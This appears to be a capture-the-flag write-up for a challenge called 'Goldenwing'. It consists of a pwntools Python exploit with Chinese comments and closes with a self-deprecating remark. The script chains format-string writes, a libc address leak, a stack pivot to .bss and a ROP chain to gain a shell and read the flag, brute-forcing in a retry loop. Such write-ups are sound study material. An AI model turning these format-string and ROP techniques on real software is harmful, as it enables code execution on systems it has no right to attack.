# Goldenwing

```py
from pwn import *
context.arch="amd64"
file=ELF("./pwn")
libc=ELF("./libc.so.6")
def exp(p):
    i_stack=0x7fff60fbaf2c
    rbp=0x000000000040125d
    magic=0x00404180
    leave=0x0040160f
    def fight_fmt(payloads):
        for payload in payloads:
            p.sendafter("\n",payload)
    p.send("\n")
    p.sendlineafter("> ","2")
    p.sendlineafter("?\n","-20")
    p.sendlineafter("?\n","-20")
    p.sendlineafter("> ","3")
    p.recvuntil("them?")
    p.sendafter("\n",("%{}c%8$hhn".format((i_stack+2)&0xff)).encode().ljust(0x10,b'a')+b"%3$p") #首先把success函数里for循环的计数变量改一下，拿到足够多的格式化字符串漏洞。此处需要爆破
    p.recvuntil('0x')
    libc.address=int(p.recv(12),16)-0x114887
    p.sendafter("\n","%{}c%12$hn".format(0xffff))
    p.sendafter("\n","%8$p")
    p.recvuntil("0x")
    success_ret=int(p.recv(12),16)-0x18
    #尝试往success函数的返回地址写rop链
    #我想着用格式化字符串写太麻烦了，故用栈迁移往bss段迁rop链
    #后面发现根本没必要……后面还导致执行system时栈空间不够，需要再迁一次。我大概一辈子都不会忘记栈迁移了
    fight_fmt([
        "%{}c%8$hhn".format(success_ret&0xff),
        "%{}c%12$hn".format(rbp&0xffff)
    ])
    success_ret+=8
    fight_fmt([
        "%{}c%8$hhn".format(success_ret&0xff),
        "%{}c%12$hn".format(magic&0xffff),
        "%{}c%8$hhn".format((success_ret+2)&0xff),
        "%{}c%12$hn".format((magic>>16)&0xffff)
    ])
    success_ret+=8
    fight_fmt([
        "%{}c%8$hhn".format(success_ret&0xff),
        "%{}c%12$hn".format(leave&0xffff),
        "%{}c%8$hhn".format((success_ret+2)&0xff),
        "%{}c%12$hn".format((leave>>16)&0xffff),
        "%{}c%8$hhn".format((success_ret+4)&0xff),
        "%{}c%12$hn".format(0xffff+1), #写n字节的时候，只需要触发溢出，就能往对应地址写null字节。比如这里是两字节，就写0xffff+1
        "%{}c%8$hhn".format((success_ret+6)&0xff),
        "%{}c%12$hn".format(0xffff+1),
    ])
    #把计数变量改成-1，不然循环太多次remote过慢
    fight_fmt([
        "%{}c%8$hhn".format((i_stack+2)&0xff),
        "%{}c%12$hn".format(0xffff),
        "%{}c%8$hhn".format(i_stack&0xff),
        "%{}c%12$hn".format(0xffff)
    ])
    fight_fmt(['a'])
    rcx=libc.address+0x000000000003d1ee
    rsp=0x0000000000035732+libc.address
    rsi=0x000000000002be51+libc.address
    rdx_r12=0x000000000011f2e7+libc.address
    #我是sb
    p.sendafter("\n",b'a'*0x80+p64(0)+p64(next(libc.search(asm('pop rdi; ret'), executable=True)))+p64(0)+p64(rsi)+p64(magic+0x300)+p64(rdx_r12)+p64(32)+p64(0)+p64(libc.sym['read'])+p64(rsp)+p64(magic+0x300))
    p.send(p64(0x00401610)+p64(rcx)+p64(0)+p64(libc.address+0x50a47))
    p.sendline("cat flag")
    p.sendline("echo pwned")
    content=p.recvuntil("pwned")
    print(content)
def wrapper():
    try:
        p=process("./pwn")
        exp(p)
    except EOFError:
        p.close()
        return False
    return True
while True:
    if wrapper():
        break
```
我是懂什么叫化简为繁，化可能为不可能的。怎么给我搞的这么复杂？